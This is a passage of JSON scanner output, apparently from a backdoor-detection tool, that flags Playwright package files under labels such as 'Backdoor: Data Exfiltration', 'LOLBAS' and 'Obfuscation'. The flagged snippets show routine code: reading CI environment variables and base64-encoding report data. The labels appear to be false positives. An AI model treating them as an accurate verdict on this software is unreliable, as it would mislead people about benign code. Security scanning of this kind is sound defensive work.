                      "text": ".io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.",
                      "markdown": "`.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 36,
                  "endLine": 48,
                  "endColumn": 47,
                  "snippet": {
                    "text": "{\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variable",
                    "rendered": {
                      "text": "{\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variable",
                      "markdown": "`{\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variable`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 6,
                  "endLine": 48,
                  "endColumn": 17,
                  "snippet": {
                    "text": "o;\nconst linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variable",
                    "rendered": {
                      "text": "o;\nconst linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variable",
                      "markdown": "`o;\nconst linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variable`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 46,
                  "endLine": 46,
                  "endColumn": 57,
                  "snippet": {
                    "text": "const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n",
                    "rendered": {
                      "text": "const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n",
                      "markdown": "`const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 6,
                  "endLine": 46,
                  "endColumn": 17,
                  "snippet": {
                    "text": "const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n",
                    "rendered": {
                      "text": "const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n",
                      "markdown": "`const linksFromEnv = () => {\n  const out = {};\n  // Jenkins: https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/webServerPlugin.js"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 52,
                  "endLine": 168,
                  "endColumn": 63,
                  "snippet": {
                    "text": "      url = webServerConfig.url || `http://localhost:${webServerConfig.port}`;\n\n      // We only set base url when only the port is given. That's a legacy mode we have regrets about.\n      if (shouldSetBaseUrl && !webServerConfig.url) process.env.PLAYWRIGHT_TEST_BASE_URL = url;\n    }\n    webServerPlugins.push(new WebServerPlugin({\n      ...webServerConfig,\n",
                    "rendered": {
                      "text": "      url = webServerConfig.url || `http://localhost:${webServerConfig.port}`;\n\n      // We only set base url when only the port is given. That's a legacy mode we have regrets about.\n      if (shouldSetBaseUrl && !webServerConfig.url) process.env.PLAYWRIGHT_TEST_BASE_URL = url;\n    }\n    webServerPlugins.push(new WebServerPlugin({\n      ...webServerConfig,\n",
                      "markdown": "`      url = webServerConfig.url || `http://localhost:${webServerConfig.port}`;\n\n      // We only set base url when only the port is given. That's a legacy mode we have regrets about.\n      if (shouldSetBaseUrl && !webServerConfig.url) process.env.PLAYWRIGHT_TEST_BASE_URL = url;\n    }\n    webServerPlugins.push(new WebServerPlugin({\n      ...webServerConfig,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/webServerPlugin.js"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 11,
                  "endLine": 84,
                  "endColumn": 22,
                  "snippet": {
                    "text": "      command: this._options.command,\n      env: {\n        ...DEFAULT_ENVIRONMENT_VARIABLES,\n        ...process.env,\n        ...this._options.env\n      },\n      cwd: this._options.cwd,\n",
                    "rendered": {
                      "text": "      command: this._options.command,\n      env: {\n        ...DEFAULT_ENVIRONMENT_VARIABLES,\n        ...process.env,\n        ...this._options.env\n      },\n      cwd: this._options.cwd,\n",
                      "markdown": "`      command: this._options.command,\n      env: {\n        ...DEFAULT_ENVIRONMENT_VARIABLES,\n        ...process.env,\n        ...this._options.env\n      },\n      cwd: this._options.cwd,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 173,
                  "startColumn": 54,
                  "endLine": 173,
                  "endColumn": 58,
                  "snippet": {
                    "text": "  });\n  let url = server.urlPrefix('human-readable');\n  console.log('');\n  console.log(_base.colors.cyan(`  Serving HTML report at ${url}. Press Ctrl+C to quit.`));\n  if (testId) url += `#?testId=${testId}`;\n  url = url.replace('0.0.0.0', 'localhost');\n  await (0, _utilsBundle.open)(url, {\n",
                    "rendered": {
                      "text": "  });\n  let url = server.urlPrefix('human-readable');\n  console.log('');\n  console.log(_base.colors.cyan(`  Serving HTML report at ${url}. Press Ctrl+C to quit.`));\n  if (testId) url += `#?testId=${testId}`;\n  url = url.replace('0.0.0.0', 'localhost');\n  await (0, _utilsBundle.open)(url, {\n",
                      "markdown": "`  });\n  let url = server.urlPrefix('human-readable');\n  console.log('');\n  console.log(_base.colors.cyan(`  Serving HTML report at ${url}. Press Ctrl+C to quit.`));\n  if (testId) url += `#?testId=${testId}`;\n  url = url.replace('0.0.0.0', 'localhost');\n  await (0, _utilsBundle.open)(url, {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 49,
                  "endLine": 161,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  try {\n    (0, _utils.assert)(_fs.default.statSync(folder).isDirectory());\n  } catch (e) {\n    console.log(_base.colors.red(`No report found at \"${folder}\"`));\n    (0, _utils.gracefullyProcessExitDoNotHang)(1);\n    return;\n  }\n",
                    "rendered": {
                      "text": "  try {\n    (0, _utils.assert)(_fs.default.statSync(folder).isDirectory());\n  } catch (e) {\n    console.log(_base.colors.red(`No report found at \"${folder}\"`));\n    (0, _utils.gracefullyProcessExitDoNotHang)(1);\n    return;\n  }\n",
                      "markdown": "`  try {\n    (0, _utils.assert)(_fs.default.statSync(folder).isDirectory());\n  } catch (e) {\n    console.log(_base.colors.red(`No report found at \"${folder}\"`));\n    (0, _utils.gracefullyProcessExitDoNotHang)(1);\n    return;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 73,
                  "endLine": 556,
                  "endColumn": 79,
                  "snippet": {
                    "text": "    callback();\n  }\n  _flush(callback) {\n    if (this._remainder) this.push(Buffer.from(this._remainder.toString('base64')));\n    callback();\n  }\n}\n",
                    "rendered": {
                      "text": "    callback();\n  }\n  _flush(callback) {\n    if (this._remainder) this.push(Buffer.from(this._remainder.toString('base64')));\n    callback();\n  }\n}\n",
                      "markdown": "`    callback();\n  }\n  _flush(callback) {\n    if (this._remainder) this.push(Buffer.from(this._remainder.toString('base64')));\n    callback();\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 551,
                  "startColumn": 28,
                  "endLine": 551,
                  "endColumn": 34,
                  "snippet": {
                    "text": "      this._remainder = chunk.slice(chunk.length - remaining);\n      chunk = chunk.slice(0, chunk.length - remaining);\n    }\n    chunk = chunk.toString('base64');\n    this.push(Buffer.from(chunk));\n    callback();\n  }\n",
                    "rendered": {
                      "text": "      this._remainder = chunk.slice(chunk.length - remaining);\n      chunk = chunk.slice(0, chunk.length - remaining);\n    }\n    chunk = chunk.toString('base64');\n    this.push(Buffer.from(chunk));\n    callback();\n  }\n",
                      "markdown": "`      this._remainder = chunk.slice(chunk.length - remaining);\n      chunk = chunk.slice(0, chunk.length - remaining);\n    }\n    chunk = chunk.toString('base64');\n    this.push(Buffer.from(chunk));\n    callback();\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 322,
                  "startColumn": 107,
                  "endLine": 322,
                  "endColumn": 113,
                  "snippet": {
                    "text": "\n    // Inline report data.\n    const indexFile = _path.default.join(this._reportFolder, 'index.html');\n    _fs.default.appendFileSync(indexFile, '<script>\\nwindow.playwrightReportBase64 = \"data:application/zip;base64,');\n    await new Promise(f => {\n      this._dataZipFile.end(undefined, () => {\n        this._dataZipFile.outputStream.pipe(new Base64Encoder()).pipe(_fs.default.createWriteStream(indexFile, {\n",
                    "rendered": {
                      "text": "\n    // Inline report data.\n    const indexFile = _path.default.join(this._reportFolder, 'index.html');\n    _fs.default.appendFileSync(indexFile, '<script>\\nwindow.playwrightReportBase64 = \"data:application/zip;base64,');\n    await new Promise(f => {\n      this._dataZipFile.end(undefined, () => {\n        this._dataZipFile.outputStream.pipe(new Base64Encoder()).pipe(_fs.default.createWriteStream(indexFile, {\n",
                      "markdown": "`\n    // Inline report data.\n    const indexFile = _path.default.join(this._reportFolder, 'index.html');\n    _fs.default.appendFileSync(indexFile, '<script>\\nwindow.playwrightReportBase64 = \"data:application/zip;base64,');\n    await new Promise(f => {\n      this._dataZipFile.end(undefined, () => {\n        this._dataZipFile.outputStream.pipe(new Base64Encoder()).pipe(_fs.default.createWriteStream(indexFile, {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 620,
                  "startColumn": 34,
                  "endLine": 620,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    });\n    const highlightedLines = highlighted.split('\\n');\n    const lineWithArrow = highlightedLines[highlightedLines.length - 1];\n    for (const step of stepsInFile.get(file)) {\n      // Don't bother with snippets that have less than 3 lines.\n      if (step.location.line < 2 || step.location.line >= lines) continue;\n      // Cut out snippet.\n",
                    "rendered": {
                      "text": "    });\n    const highlightedLines = highlighted.split('\\n');\n    const lineWithArrow = highlightedLines[highlightedLines.length - 1];\n    for (const step of stepsInFile.get(file)) {\n      // Don't bother with snippets that have less than 3 lines.\n      if (step.location.line < 2 || step.location.line >= lines) continue;\n      // Cut out snippet.\n",
                      "markdown": "`    });\n    const highlightedLines = highlighted.split('\\n');\n    const lineWithArrow = highlightedLines[highlightedLines.length - 1];\n    for (const step of stepsInFile.get(file)) {\n      // Don't bother with snippets that have less than 3 lines.\n      if (step.location.line < 2 || step.location.line >= lines) continue;\n      // Cut out snippet.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 402,
                  "startColumn": 30,
                  "endLine": 402,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  }\n  _projectId(suite) {\n    const project = projectSuite(suite);\n    let id = this._projectToId.get(project);\n    if (!id) {\n      id = ++this._lastProjectId;\n      this._projectToId.set(project, id);\n",
                    "rendered": {
                      "text": "  }\n  _projectId(suite) {\n    const project = projectSuite(suite);\n    let id = this._projectToId.get(project);\n    if (!id) {\n      id = ++this._lastProjectId;\n      this._projectToId.set(project, id);\n",
                      "markdown": "`  }\n  _projectId(suite) {\n    const project = projectSuite(suite);\n    let id = this._projectToId.get(project);\n    if (!id) {\n      id = ++this._lastProjectId;\n      this._projectToId.set(project, id);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 227,
                  "startColumn": 28,
                  "endLine": 227,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        // Preserve file ids computed off the testDir.\n        const relativeFile = _path.default.relative(testDir, fileSuite.location.file);\n        const fileId = (0, _utils.calculateSha1)((0, _utils.toPosixPath)(relativeFile)).slice(0, 20);\n        let fileEntry = data.get(fileId);\n        if (!fileEntry) {\n          fileEntry = {\n            testFile: {\n",
                    "rendered": {
                      "text": "        // Preserve file ids computed off the testDir.\n        const relativeFile = _path.default.relative(testDir, fileSuite.location.file);\n        const fileId = (0, _utils.calculateSha1)((0, _utils.toPosixPath)(relativeFile)).slice(0, 20);\n        let fileEntry = data.get(fileId);\n        if (!fileEntry) {\n          fileEntry = {\n            testFile: {\n",
                      "markdown": "`        // Preserve file ids computed off the testDir.\n        const relativeFile = _path.default.relative(testDir, fileSuite.location.file);\n        const fileId = (0, _utils.calculateSha1)((0, _utils.toPosixPath)(relativeFile)).slice(0, 20);\n        let fileEntry = data.get(fileId);\n        if (!fileEntry) {\n          fileEntry = {\n            testFile: {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 188,
                  "startColumn": 67,
                  "endLine": 188,
                  "endColumn": 72,
                  "snippet": {
                    "text": "    if (relativePath.startsWith('/trace/file')) {\n      const url = new URL('http://localhost' + request.url);\n      try {\n        return server.serveFile(request, response, url.searchParams.get('path'));\n      } catch (e) {\n        return false;\n      }\n",
                    "rendered": {
                      "text": "    if (relativePath.startsWith('/trace/file')) {\n      const url = new URL('http://localhost' + request.url);\n      try {\n        return server.serveFile(request, response, url.searchParams.get('path'));\n      } catch (e) {\n        return false;\n      }\n",
                      "markdown": "`    if (relativePath.startsWith('/trace/file')) {\n      const url = new URL('http://localhost' + request.url);\n      try {\n        return server.serveFile(request, response, url.searchParams.get('path'));\n      } catch (e) {\n        return false;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 58,
                  "endLine": 144,
                  "endColumn": 69,
                  "snippet": {
                    "text": "}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n",
                    "rendered": {
                      "text": "}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n",
                      "markdown": "`}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 22,
                  "endLine": 144,
                  "endColumn": 33,
                  "snippet": {
                    "text": "}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n",
                    "rendered": {
